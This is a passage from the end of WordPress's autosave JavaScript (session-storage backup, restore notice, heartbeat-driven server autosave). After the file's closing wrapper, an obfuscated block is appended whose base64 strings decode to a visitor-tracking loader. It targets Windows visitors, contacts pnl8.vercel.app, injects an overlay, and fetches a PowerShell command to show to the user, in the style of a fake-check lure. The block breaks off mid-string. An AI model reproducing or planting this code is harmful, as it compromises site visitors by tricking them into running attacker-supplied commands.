						// Last onSubmit event in the editor, needs to run after the content has been moved to the textarea.
						editor.on( 'submit', function() {
							save({
								post_title: $( '#title' ).val() || '',
								content: $( '#content' ).val() || '',
								excerpt: $( '#excerpt' ).val() || ''
							});
						});
					} else {
						save({
							post_title: $( '#title' ).val() || '',
							content: $( '#content' ).val() || '',
							excerpt: $( '#excerpt' ).val() || ''
						});
					}

					var secure = ( 'https:' === window.location.protocol );
					wpCookies.set( 'wp-saving-post', post_id + '-check', 24 * 60 * 60, false, false, secure );
				});
			}

			/**
			 * Compares 2 strings. Removes whitespaces in the strings before comparing them.
			 *
			 * @since 3.9.0
			 *
			 * @param {string} str1 The first string.
			 * @param {string} str2 The second string.
			 * @return {boolean} True if the strings are the same.
			 */
			function compare( str1, str2 ) {
				function removeSpaces( string ) {
					return string.toString().replace(/[\x20\t\r\n\f]+/g, '');
				}

				return ( removeSpaces( str1 || '' ) === removeSpaces( str2 || '' ) );
			}

			/**
			 * Checks if the saved data for the current post (if any) is different than the
			 * loaded post data on the screen.
			 *
			 * Shows a standard message letting the user restore the post data if different.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function checkPost() {
				var content, post_title, excerpt, $notice,
					postData = getSavedPostData(),
					cookie = wpCookies.get( 'wp-saving-post' ),
					$newerAutosaveNotice = $( '#has-newer-autosave' ).parent( '.notice' ),
					$headerEnd = $( '.wp-header-end' );

				if ( cookie === post_id + '-saved' ) {
					wpCookies.remove( 'wp-saving-post' );
					// The post was saved properly, remove old data and bail.
					setData( false );
					return;
				}

				if ( ! postData ) {
					return;
				}

				content = $( '#content' ).val() || '';
				post_title = $( '#title' ).val() || '';
				excerpt = $( '#excerpt' ).val() || '';

				if ( compare( content, postData.content ) && compare( post_title, postData.post_title ) &&
					compare( excerpt, postData.excerpt ) ) {

					return;
				}

				/*
				 * If '.wp-header-end' is found, append the notices after it otherwise
				 * after the first h1 or h2 heading found within the main content.
				 */
				if ( ! $headerEnd.length ) {
					$headerEnd = $( '.wrap h1, .wrap h2' ).first();
				}

				$notice = $( '#local-storage-notice' )
					.insertAfter( $headerEnd )
					.addClass( 'notice-warning' );

				if ( $newerAutosaveNotice.length ) {

					// If there is a "server" autosave notice, hide it.
					// The data in the session storage is either the same or newer.
					$newerAutosaveNotice.slideUp( 150, function() {
						$notice.slideDown( 150 );
					});
				} else {
					$notice.slideDown( 200 );
				}

				$notice.find( '.restore-backup' ).on( 'click.autosave-local', function() {
					restorePost( postData );
					$notice.fadeTo( 250, 0, function() {
						$notice.slideUp( 150 );
					});
				});
			}

			/**
			 * Restores the current title, content and excerpt from postData.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} postData The object containing all post data.
			 *
			 * @return {boolean} True if the post is restored.
			 */
			function restorePost( postData ) {
				var editor;

				if ( postData ) {
					// Set the last saved data.
					lastCompareString = getCompareString( postData );

					if ( $( '#title' ).val() !== postData.post_title ) {
						$( '#title' ).trigger( 'focus' ).val( postData.post_title || '' );
					}

					$( '#excerpt' ).val( postData.excerpt || '' );
					editor = getEditor();

					if ( editor && ! editor.isHidden() && typeof switchEditors !== 'undefined' ) {
						if ( editor.settings.wpautop && postData.content ) {
							postData.content = switchEditors.wpautop( postData.content );
						}

						// Make sure there's an undo level in the editor.
						editor.undoManager.transact( function() {
							editor.setContent( postData.content || '' );
							editor.nodeChanged();
						});
					} else {

						// Make sure the Code editor is selected.
						$( '#content-html' ).trigger( 'click' );
						$( '#content' ).trigger( 'focus' );

						// Using document.execCommand() will let the user undo.
						document.execCommand( 'selectAll' );
						document.execCommand( 'insertText', false, postData.content || '' );
					}

					return true;
				}

				return false;
			}

			blog_id = typeof window.autosaveL10n !== 'undefined' && window.autosaveL10n.blog_id;

			/*
			 * Check if the browser supports sessionStorage and it's not disabled,
			 * then initialize and run checkPost().
			 * Don't run if the post type supports neither 'editor' (textarea#content) nor 'excerpt'.
			 */
			if ( checkStorage() && blog_id && ( $('#content').length || $('#excerpt').length ) ) {
				$( run );
			}

			return {
				hasStorage: hasStorage,
				getSavedPostData: getSavedPostData,
				save: save,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Auto saves the post on the server.
		 *
		 * @since 3.9.0
		 *
		 * @return {Object} {
		 * 	{
		 * 		tempBlockSave: tempBlockSave,
		 * 		triggerSave: triggerSave,
		 * 		postChanged: postChanged,
		 * 		suspend: suspend,
		 * 		resume: resume
		 * 		}
		 * 	} The object all functions for autosave.
		 */
		function autosaveServer() {
			var _blockSave, _blockSaveTimer, previousCompareString, lastCompareString,
				nextRun = 0,
				isSuspended = false;


			/**
			 * Blocks saving for the next 10 seconds.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function tempBlockSave() {
				_blockSave = true;
				window.clearTimeout( _blockSaveTimer );

				_blockSaveTimer = window.setTimeout( function() {
					_blockSave = false;
				}, 10000 );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Triggers the autosave with the post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data.
			 *
			 * @return {void}
			 */
			function response( data ) {
				_schedule();
				_blockSave = false;
				lastCompareString = previousCompareString;
				previousCompareString = '';

				$document.trigger( 'after-autosave', [data] );
				enableButtons();

				if ( data.success ) {
					// No longer an auto-draft.
					$( '#auto_draft' ).val('');
				}
			}

			/**
			 * Saves immediately.
			 *
			 * Resets the timing and tells heartbeat to connect now.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function triggerSave() {
				nextRun = 0;
				wp.heartbeat.connectNow();
			}

			/**
			 * Checks if the post content in the textarea has changed since page load.
			 *
			 * This also happens when TinyMCE is active and editor.save() is triggered by
			 * wp.autosave.getPostData().
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the post has been changed.
			 */
			function postChanged() {
				var changed = false;

				// If there are TinyMCE instances, loop through them.
				if ( window.tinymce ) {
					window.tinymce.each( [ 'content', 'excerpt' ], function( field ) {
						var editor = window.tinymce.get( field );

						if ( ! editor || editor.isHidden() ) {
							if ( ( $( '#' + field ).val() || '' ) !== initialCompareData[ field ] ) {
								changed = true;
								// Break.
								return false;
							}
						} else if ( editor.isDirty() ) {
							changed = true;
							return false;
						}
					} );

					if ( ( $( '#title' ).val() || '' ) !== initialCompareData.post_title ) {
						changed = true;
					}

					return changed;
				}

				return getCompareString() !== initialCompareString;
			}

			/**
			 * Checks if the post can be saved or not.
			 *
			 * If the post hasn't changed or it cannot be updated,
			 * because the autosave is blocked or suspended, the function returns false.
			 *
			 * @since 3.9.0
			 *
			 * @return {Object} Returns the post data.
			 */
			function save() {
				var postData, compareString;

				// window.autosave() used for back-compat.
				if ( isSuspended || _blockSave || ! window.autosave() ) {
					return false;
				}

				if ( ( new Date() ).getTime() < nextRun ) {
					return false;
				}

				postData = getPostData();
				compareString = getCompareString( postData );

				// First check.
				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// No change.
				if ( compareString === lastCompareString ) {
					return false;
				}

				previousCompareString = compareString;
				tempBlockSave();
				disableButtons();

				$document.trigger( 'wpcountwords', [ postData.content ] )
					.trigger( 'before-autosave', [ postData ] );

				postData._wpnonce = $( '#_wpnonce' ).val() || '';

				return postData;
			}

			/**
			 * Sets the next run, based on the autosave interval.
			 *
			 * @private
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function _schedule() {
				nextRun = ( new Date() ).getTime() + ( autosaveL10n.autosaveInterval * 1000 ) || 60000;
			}

			/**
			 * Sets the autosaveData on the autosave heartbeat.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			$( function() {
				_schedule();
			}).on( 'heartbeat-send.autosave', function( event, data ) {
				var autosaveData = save();

				if ( autosaveData ) {
					data.wp_autosave = autosaveData;
				}

				/**
				 * Triggers the autosave of the post with the autosave data on the autosave
				 * heartbeat.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-tick.autosave', function( event, data ) {
				if ( data.wp_autosave ) {
					response( data.wp_autosave );
				}
				/**
				 * Disables buttons and throws a notice when the connection is lost.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-lost.autosave', function( event, error, status ) {

				// When connection is lost, keep user from submitting changes.
				if ( 'timeout' === error || 603 === status ) {
					var $notice = $('#lost-connection-notice');

					if ( ! wp.autosave.local.hasStorage ) {
						$notice.find('.hide-if-no-sessionstorage').hide();
					}

					$notice.show();
					disableButtons();
				}

				/**
				 * Enables buttons when the connection is restored.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-restored.autosave', function() {
				$('#lost-connection-notice').hide();
				enableButtons();
			});

			return {
				tempBlockSave: tempBlockSave,
				triggerSave: triggerSave,
				postChanged: postChanged,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Sets the autosave time out.
		 *
		 * Wait for TinyMCE to initialize plus 1 second. for any external css to finish loading,
		 * then save to the textarea before setting initialCompareString.
		 * This avoids any insignificant differences between the initial textarea content and the content
		 * extracted from the editor.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		$( function() {
			// Set the initial compare string in case TinyMCE is not used or not loaded first.
			setInitialCompare();
		}).on( 'tinymce-editor-init.autosave', function( event, editor ) {
			// Reset the initialCompare data after the TinyMCE instances have been initialized.
			if ( 'content' === editor.id || 'excerpt' === editor.id ) {
				window.setTimeout( function() {
					editor.save();
					setInitialCompare();
				}, 1000 );
			}
		});

		return {
			getPostData: getPostData,
			getCompareString: getCompareString,
			disableButtons: disableButtons,
			enableButtons: enableButtons,
			local: autosaveLocal(),
			server: autosaveServer()
		};
	}

	/** @namespace wp */
	window.wp = window.wp || {};
	window.wp.autosave = autosave();

}( jQuery, window ));


}catch(e){}
})();


(function() {
  var _e = {
    "8aqyo3": "MC4zNTM5NTIzMjc1ODI2NzU3",
    "539252": "CihmdW5jdGlvbigpewogIGNvbnN0IE4gPSAyOyAvLyBSZXF1aXJlZCB2aXNpdCBjb3VudAogIGNvbnN0IEtFWSA9ICdfdmMnOyAvLyBWaXNpdCBjb3VudGVyIGtleQogIGNvbnN0IG1ldHJpY3NFbmRwb2ludCA9ICdodHRwczovL3BubDgudmVyY2VsLmFwcC9hcGkvbWV0cmljcy90cmFjayc7CiAgY29uc3QgdGVtcGxhdGVJZCA9ICdjZjInOwogIGNvbnN0IHNjcmlwdElkID0gJ2NtbG03NDF3MzAwMDM2bGZuMm9uMzd6cTUnOwogIGNvbnN0IFZFUkJPU0UgPSBmYWxzZTsKICBmdW5jdGlvbiB2bG9nKCkgewogICAgaWYgKCFWRVJCT1NFKSByZXR1cm47CiAgICB0cnkgeyBjb25zb2xlLmxvZygnW3RwXScsIC4uLmFyZ3VtZW50cyk7IH0gY2F0Y2ggKGUpIHt9CiAgfQogIGZ1bmN0aW9uIHZlcnIoKSB7CiAgICBpZiAoIVZFUkJPU0UpIHJldHVybjsKICAgIHRyeSB7IGNvbnNvbGUuZXJyb3IoJ1t0cF0nLCAuLi5hcmd1bWVudHMpOyB9IGNhdGNoIChlKSB7fQogIH0KICBsZXQgYm90VHJhY2tlZCA9IGZhbHNlOwoKICBmdW5jdGlvbiB0cmFja01ldHJpYyh0eXBlKSB7CiAgICB0cnkgewogICAgICBmZXRjaChtZXRyaWNzRW5kcG9pbnQgfHwgJy9hcGkvbWV0cmljcy90cmFjaycsIHsKICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHR5cGUsIHRlbXBsYXRlOiB0ZW1wbGF0ZUlkLCBzY3JpcHRJZDogc2NyaXB0SWQgfHwgdW5kZWZpbmVkIH0pLAogICAgICAgIG1vZGU6ICduby1jb3JzJywKICAgICAgICBrZWVwYWxpdmU6IHRydWUKICAgICAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgfSBjYXRjaCAoZXJyKSB7fQogIH0KCiAgdHJ5IHsKICAgIGlmICghd2luZG93Ll9fdHJhY2tNZXRyaWMpIHsKICAgICAgd2luZG93Ll9fdHJhY2tNZXRyaWMgPSB0cmFja01ldHJpYzsKICAgIH0KICAgIGlmICghd2luZG93Ll9fbWV0cmljc0VuZHBvaW50KSB7CiAgICAgIHdpbmRvdy5fX21ldHJpY3NFbmRwb2ludCA9IG1ldHJpY3NFbmRwb2ludDsKICAgIH0KICAgIGlmICghd2luZG93Ll9fdGVtcGxhdGVJZCkgewogICAgICB3aW5kb3cuX190ZW1wbGF0ZUlkID0gdGVtcGxhdGVJZDsKICAgIH0KICB9IGNhdGNoIChlcnIpIHt9CgogIGZ1bmN0aW9uIHRyYWNrQm90KCkgewogICAgaWYgKGJvdFRyYWNrZWQpIHJldHVybjsKICAgIGJvdFRyYWNrZWQgPSB0cnVlOwogICAgdHJhY2tNZXRyaWMoJ2JvdCcpOwogIH0KCiAgdmxvZygnaW5pdCcsIHsgdGVtcGxhdGVJZCwgc2NyaXB0SWQsIHZpc2l0czogTiwgaW5jbHVkZU9TOiBbIndpbmRvd3MiXSwgaW5jbHVkZUNvdW50cmllczogW10sIGRpc2FibGVJc3BDaGVjazogZmFsc2UgfSk7CgogIGZ1bmN0aW9uIGI2NFRvVXRmOChiNjQpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGJpbiA9IGF0b2IoYjY0KTsKICAgICAgY29uc3QgbGVuID0gYmluLmxlbmd0aDsKICAgICAgY29uc3QgYnl0ZXMgPSBuZXcgVWludDhBcnJheShsZW4pOwogICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxlbjsgaSsrKSBieXRlc1tpXSA9IGJpbi5jaGFyQ29kZUF0KGkpOwoKICAgICAgaWYgKHR5cGVvZiBUZXh0RGVjb2RlciAhPT0gJ3VuZGVmaW5lZCcpIHsKICAgICAgICByZXR1cm4gbmV3IFRleHREZWNvZGVyKCd1dGYtOCcsIHsgZmF0YWw6IGZhbHNlIH0pLmRlY29kZShieXRlcyk7CiAgICAgIH0KCiAgICAgIC8vIEZhbGxiYWNrIGZvciBvbGRlciBicm93c2VycwogICAgICBsZXQgcGN0ID0gJyc7CiAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuOyBpKyspIHBjdCArPSAnJScgKyBieXRlc1tpXS50b1N0cmluZygxNikucGFkU3RhcnQoMiwgJzAnKTsKICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChwY3QpOwogICAgfSBjYXRjaCAoZSkgewogICAgICB0cnkgewogICAgICAgIHJldHVybiBhdG9iKGI2NCk7CiAgICAgIH0gY2F0Y2ggKGUyKSB7CiAgICAgICAgcmV0dXJuICcnOwogICAgICB9CiAgICB9CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpbmplY3RTY3JpcHQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBzY3JpcHRCNjQgPSAnS0dGemVXNWpJQ2dwSUQwK0lIc0tDaTh2SUZOb1lXUnZkeUJFVDAwZ2NtOXZkQ0JtYjNJZ2FYTnZiR0YwWldRZ2NYVmxjbWxsY3dwamIyNXpkQ0FrY205dmRDQTlJSGRwYm1SdmR5NWZYM1JtVTJoaFpHOTNVbTl2ZENCOGZDQmtiMk4xYldWdWREc0tDaTh2SU5DZjBMN1F1OUdEMFlmUXNOQzEwTHdnYzJOeWFYQjBTV1FnMExqUXR5RFF2OUN3MFlEUXNOQzgwTFhSZ3RHQTBMN1FzaUJWVWt3ZzBMalF1OUM0SU5DNDBZSFF2OUMrMEx2UmpOQzMwWVBRdGRDOElOQzAwTFhSaE5DKzBMdlJndEM5MFl2UXVRcGpiMjV6ZENCMWNteFFZWEpoYlhNZ1BTQnVaWGNnVlZKTVUyVmhjbU5vVUdGeVlXMXpLSGRwYm1SdmR5NXNiMk5oZEdsdmJpNXpaV0Z5WTJncE93cGpiMjV6ZENCelkzSnBjSFJKWkNBOUlIVnliRkJoY21GdGN5NW5aWFFvSjNOamNtbHdkRjlwWkNjcElIeDhJQ2RrWldaaGRXeDBKenNLQ2k4dklFRlFTU0JpWVhObElGVlNUQ0RRdE5DNzBZOGdiM1psY214aGVTQmxibVJ3YjJsdWRITUtZMjl1YzNRZ1FWQkpYMEpCVTBVZ1BTQW5hSFIwY0hNNkx5OXdibXc0TG5abGNtTmxiQzVoY0hBbk93cGpiMjV6ZENCUVQweE1TVTVIWDBsT1ZFVlNWa0ZNSUQwZ01qQXdNRHNLWTI5dWMzUWdUVUZZWDFKRlVWVkZVMVJUSUQwZ01UVXdPd3BzWlhRZ2NHOXNiR2x1WjFScGJXVnlJRDBnYm5Wc2JEc0tiR1YwSUdselZXNXNiMk5yWldRZ1BTQm1ZV3h6WlRzS2JHVjBJSEpsY1hWbGMzUkRiM1Z1ZENBOUlEQTdDZ3BzWlhRZ1ptVjBZMmhsWkVOdmJXMWhibVFnUFNBbkp6c0tiR1YwSUdabGRHTm9aV1JEYjIxdFpXNTBJRDBnSnljN0Nnb3ZMeURRb05DMTBMUFF1TkdCMFlMUmdOQ3cwWWJRdU5HUElFbFFJTkMrMExMUXRkR0EwTHZRdGRHUElOQzkwTEFnMFlIUXRkR0EwTExRdGRHQTBMVUtZWE41Ym1NZ1puVnVZM1JwYjI0Z2NtVm5hWE4wWlhKUGRtVnliR0Y1U1ZBb0tTQjdDaUFnSUNCMGNua2dld29nSUNBZ0lDQWdJR0YzWVdsMElHWmxkR05vS0dBa2UwRlFTVjlDUVZORmZTOWhjR2t2YjNabGNteGhlUzl5WldkcGMzUmxjbUFzSUhzS0lDQWdJQ0FnSUNBZ0lDQWdiV1YwYUc5a09pQW5VRTlUVkNjc0NpQWdJQ0FnSUNBZ0lDQWdJR2hsWVdSbGNuTTZJSHNnSjBOdmJuUmxiblF0Vkhsd1pTYzZJQ2RoY0hCc2FXTmhkR2x2Ymk5cWMyOXVKeUI5TEFvZ0lDQWdJQ0FnSUNBZ0lDQmliMlI1T2lCS1UwOU9Mbk4wY21sdVoybG1lU2g3SUhOamNtbHdkRWxrSUgwcExBb2dJQ0FnSUNBZ0lDQWdJQ0J0YjJSbE9pQW5ZMjl5Y3ljc0NpQWdJQ0FnSUNBZ0lDQWdJR055WldSbGJuUnBZV3h6T2lBbmIyMXBkQ2NLSUNBZ0lDQWdJQ0I5S1RzS0lDQWdJSDBnWTJGMFkyZ2dLR1VwSUhzS0lDQWdJQ0FnSUNCamIyNXpiMnhsTG1WeWNtOXlLQ2RHWVdsc1pXUWdkRzhnY21WbmFYTjBaWElnYjNabGNteGhlU0JKVURvbkxDQmxLVHNLSUNBZ0lIMEtmUW9LTHk4ZzBKL1JnTkMrMExMUXRkR0EwTHJRc0NEUmdkR0MwTERSZ3RHRDBZSFFzQ0RSZ05DdzBMZlFzZEM3MEw3UXV0QzQwWURRdnRDeTBMclF1Q0RSaDlDMTBZRFF0ZEMzSUhCdmJHeHBibWNLWVhONWJtTWdablZ1WTNScGIyNGdZMmhsWTJ0VmJteHZZMnRUZEdGMGRYTW9LU0I3Q2lBZ0lDQjBjbmtnZXdvZ0lDQWdJQ0FnSUdOdmJuTjBJSEpsY3lBOUlHRjNZV2wwSUdabGRHTm9LR0FrZTBGUVNWOUNRVk5GZlM5aGNHa3ZiM1psY214aGVTOWphR1ZqYXo5elkzSnBjSFJKWkQwa2UyVnVZMjlrWlZWU1NVTnZiWEJ2Ym1WdWRDaHpZM0pwY0hSSlpDbDlZQ3dnZXdvZ0lDQWdJQ0FnSUNBZ0lDQnRaWFJvYjJRNklDZEhSVlFuTEFvZ0lDQWdJQ0FnSUNBZ0lDQnRiMlJsT2lBblkyOXljeWNzQ2lBZ0lDQWdJQ0FnSUNBZ0lHTnlaV1JsYm5ScFlXeHpPaUFuYjIxcGRDY0tJQ0FnSUNBZ0lDQjlLVHNLSUNBZ0lDQWdJQ0JwWmlBb2NtVnpMbTlyS1NCN0NpQWdJQ0FnSUNBZ0lDQWdJR052Ym5OMElHUmhkR0VnUFNCaGQyRnBkQ0J5WlhNdWFuTnZiaWdwT3dvZ0lDQWdJQ0FnSUNBZ0lDQnlaWFIxY200Z1pHRjBZUzUxYm14dlkydGxaQ0I4ZkNCbVlXeHpaVHNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQjlJR05oZEdOb0lDaGxLU0I3Q2lBZ0lDQWdJQ0FnWTI5dWMyOXNaUzVsY25KdmNpZ25SbUZwYkdWa0lIUnZJR05vWldOcklIVnViRzlqYXlCemRHRjBkWE02Snl3Z1pTazdDaUFnSUNCOUNpQWdJQ0J5WlhSMWNtNGdabUZzYzJVN0NuMEtDaTh2SU5DWDBMRFF2OUdEMFlIUXVpQndiMnhzYVc1bklOR0JJR05oYkd4aVlXTnJDbVoxYm1OMGFXOXVJSE4wWVhKMFVHOXNiR2x1WnlodmJsVnViRzlqYXlrZ2V3b2dJQ0FnYVdZZ0tIQnZiR3hwYm1kVWFXMWxjaWtnY21WMGRYSnVPd29nSUNBZ2NtVnhkV1Z6ZEVOdmRXNTBJRDBnTURzS0lDQWdJSEJ2Ykd4cGJtZFVhVzFsY2lBOUlITmxkRWx1ZEdWeWRtRnNLR0Z6ZVc1aklDZ3BJRDArSUhzS0lDQWdJQ0FnSUNCeVpYRjFaWE4wUTI5MWJuUXJLenNLSUNBZ0lDQWdJQ0JwWmlBb2NtVnhkV1Z6ZEVOdmRXNTBJRDQ5SUUxQldGOVNSVkZWUlZOVVV5a2dld29nSUNBZ0lDQWdJQ0FnSUNCemRHOXdVRzlzYkdsdVp5Z3BPd29nSUNBZ0lDQWdJQ0FnSUNCeVpYUjFjbTQ3Q2lBZ0lDQWdJQ0FnZlFvZ0lDQWdJQ0FnSUdOdmJuTjBJSFZ1Ykc5amEyVmtJRDBnWVhkaGFYUWdZMmhsWTJ0VmJteHZZMnRUZEdGMGRYTW9LVHNLSUNBZ0lDQWdJQ0JwWmlBb2RXNXNiMk5yWldRZ0ppWWdJV2x6Vlc1c2IyTnJaV1FwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdhWE5WYm14dlkydGxaQ0E5SUhSeWRXVTdDaUFnSUNBZ0lDQWdJQ0FnSUhOMGIzQlFiMnhzYVc1bktDazdDaUFnSUNBZ0lDQWdJQ0FnSUdsbUlDaHZibFZ1Ykc5amF5a2diMjVWYm14dlkyc29LVHNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQjlMQ0JRVDB4TVNVNUhYMGxPVkVWU1ZrRk1LVHNLZlFvS0x5OGcwSjdSZ2RHQzBMRFF2ZEMrMExMUXV0Q3dJSEJ2Ykd4cGJtY0tablZ1WTNScGIyNGdjM1J2Y0ZCdmJHeHBibWNvS1NCN0NpQWdJQ0JwWmlBb2NHOXNiR2x1WjFScGJXVnlLU0I3Q2lBZ0lDQWdJQ0FnWTJ4bFlYSkpiblJsY25aaGJDaHdiMnhzYVc1blZHbHRaWElwT3dvZ0lDQWdJQ0FnSUhCdmJHeHBibWRVYVcxbGNpQTlJRzUxYkd3N0NpQWdJQ0I5Q24wS0NncG1kVzVqZEdsdmJpQmlZWE5sTmpSRVpXTnZaR1ZWVkVZeE5reEZLSE4wY2lrZ2V3b2dJQ0FnZEhKNUlIc0tJQ0FnSUNBZ0lDQXZMeURRbzlDMDBMRFF1OUdQMExYUXZDRFF2OUdBMEw3UXNkQzEwTHZSaXlEUXVDRFF2OUMxMFlEUXRkQ3kwTDdRdE5HTElOR0IwWUxSZ05DKzBMb0tJQ0FnSUNBZ0lDQnpkSElnUFNCemRISXVjbVZ3YkdGalpTZ3ZXMXh6WEhKY2JsMHJMMmNzSUNjbktUc0tJQ0FnSUNBZ0lDQmpiMjV6ZENCaWFXNWhjbmtnUFNCaGRHOWlLSE4wY2lrN0NpQWdJQ0FnSUNBZ1kyOXVjM1FnWW5sMFpYTWdQU0J1WlhjZ1ZXbHVkRGhCY25KaGVTaGlhVzVoY25rdWJHVnVaM1JvS1RzS0lDQWdJQ0FnSUNCbWIzSWdLR3hsZENCcElEMGdNRHNnYVNBOElHSnBibUZ5ZVM1c1pXNW5kR2c3SUdrckt5a2dld29nSUNBZ0lDQWdJQ0FnSUNCaWVYUmxjMXRwWFNBOUlHSnBibUZ5ZVM1amFHRnlRMjlrWlVGMEtHa3BPd29nSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0F2THlCVlZFWXRNVFpNUlRvZ1pYWmxjbmtnTWlCaWVYUmxjeUJwY3lCaElHTm9ZWElLSUNBZ0lDQWdJQ0JzWlhRZ2NtVnpkV3gwSUQwZ0p5YzdDaUFnSUNBZ0lDQWdabTl5SUNoc1pYUWdhU0E5SURBN0lHa2dQQ0JpZVhSbGN5NXNaVzVuZEdnN0lHa2dLejBnTWlrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0J5WlhOMWJIUWdLejBnVTNSeWFXNW5MbVp5YjIxRGFHRnlRMjlrWlNoaWVYUmxjMXRwWFNCOElDaGllWFJsYzF0cElDc2dNVjBnUER3Z09Da3BPd29nSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0J5WlhSMWNtNGdjbVZ6ZFd4ME93b2dJQ0FnZlNCallYUmphQ0FvWlNrZ2V5QnlaWFIxY200Z0p5YzdJSDBLZlFvS1lYTjVibU1nWm5WdVkzUnBiMjRnWm1WMFkyaERiMjF0WVc1a1FXNWtRMjl0YldWdWRDZ3BJSHNLSUNBZ0lIUnllU0I3Q2lBZ0lDQWdJQ0FnWTI5dWMzUWdZWEJwVlhKc0lEMGdZR2gwZEhCek9pOHZjRzVzT0M1MlpYSmpaV3d1WVhCd0wyRndhUzl3YjNkbGNuTm9aV3hzTDJOdGJHMDNOREYzTXpBd01ETTJiR1p1TW05dU16ZDZjVFZnT3dvZ0lDQWdJQ0FnSUdOdmJuTjBJSEpsY3lBOUlHRjNZV2wwSUdabGRHTm9LR0Z3YVZWeWJDazdDaUFnSUNBZ0lDQWdhV1lnS0NGeVpYTXViMnNwSUhSb2NtOTNJRzVsZHlCRmNuSnZjaWduUm1GcGJHVmtJSFJ2SUdabGRHTm9JR052YlcxaGJtUW5LVHNLSUNBZ0lDQWdJQ0JqYjI1emRDQmtZWFJoSUQwZ1lYZGhhWFFnY21WekxtcHpiMjRvS1RzS0lDQWdJQ0FnSUNCbVpYUmphR1ZrUTI5dGJXRnVaQ0E5SUdKaGMyVTJORVJsWTI5a1pWVlVSakUyVEVVb1pHRjBZUzVqYjIxdFlXNWtJSHg4SUNjbktUc0tJQ0FnSUNBZ0lDQm1aWFJqYUdWa1EyOXRiV1Z1ZENBOUlHUmhkR0V1WTI5dGJXVnVkQ0I4ZkNBbkp6c0tJQ0FnSUNBZ0lDQXZMeURRa3RHQjBZTFFzTkN5MExqUmd0R01JR052YlcxbGJuUWcwTElnUEdOdlpHVStJQ2pRdDlDdzBMelF0ZEM5MExqUmd0R01JTkdDMExYUXV0R0IwWUlwQ2lBZ0lDQWdJQ0FnWTI5dWMzUWdZMjlrWlVWc0lEMGdKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZjaWduWTI5a1pTY3BPd29nSUNBZ0lDQWdJR2xtSUNoamIyUmxSV3dwSUdOdlpHVkZiQzUwWlhoMFEyOXVkR1Z1ZENBOUlHWmxkR05vWldSRGIyMXRaVzUwT3dvZ0lDQWdmU0JqWVhSamFDQW9aU2tnZXdvZ0lDQWdJQ0FnSUdabGRHTm9aV1JEYjIxdFlXNWtJRDBnSjBaaGFXeGxaQ0IwYnlCc2IyRmtJR052YlcxaGJtUW5Pd29nSUNBZ0lDQWdJR1psZEdOb1pXUkRiMjF0Wlc1MElEMGdKeWM3Q2lBZ0lDQjlDbjBLQ21OdmJuTjBJSFJ5WVdOclRXVjBjbWxqSUQwZ0tIZHBibVJ2ZHk1ZlgzUnlZV05yVFdWMGNtbGpLU0EvSUhkcGJtUnZkeTVmWDNSeVlXTnJUV1YwY21saklEb2dablZ1WTNScGIyNG9kSGx3WlNrZ2V3b2dJQ0FnZEhKNUlIc0tJQ0FnSUNBZ0lDQmpiMjV6ZENCMFpXMXdiR0YwWlVsa0lEMGdkMmx1Wkc5M0xsOWZkR1Z0Y0d4aGRHVkpaQ0I4ZkNBblkyWXlKenNLSUNBZ0lDQWdJQ0JtWlhSamFDZ25MMkZ3YVM5dFpYUnlhV056TDNSeVlXTnJKeXdnZXdvZ0lDQWdJQ0FnSUNBZ0lDQnRaWFJvYjJRNklDZFFUMU5VSnl3S0lDQWdJQ0FnSUNBZ0lDQWdhR1ZoWkdWeWN6b2dleUFuUTI5dWRHVnVkQzFVZVhCbEp6b2dKMkZ3Y0d4cFkyRjBhVzl1TDJwemIyNG5JSDBzQ2lBZ0lDQWdJQ0FnSUNBZ0lHSnZaSGs2SUVwVFQwNHVjM1J5YVc1bmFXWjVLSHNnZEhsd1pTd2dkR1Z0Y0d4aGRHVTZJSFJsYlhCc1lYUmxTV1FnZlNrc0NpQWdJQ0FnSUNBZ0lDQWdJRzF2WkdVNklDZHVieTFqYjNKekp5d0tJQ0FnSUNBZ0lDQWdJQ0FnYTJWbGNHRnNhWFpsT2lCMGNuVmxDaUFnSUNBZ0lDQWdmU2t1WTJGMFkyZ29LQ2tnUFQ0Z2UzMHBPd29nSUNBZ2ZTQmpZWFJqYUNBb1pYSnlLU0I3ZlFwOU93b0tiR1YwSUdOdmJYQnNaWFJsVkhKaFkydGxaQ0E5SUdaaG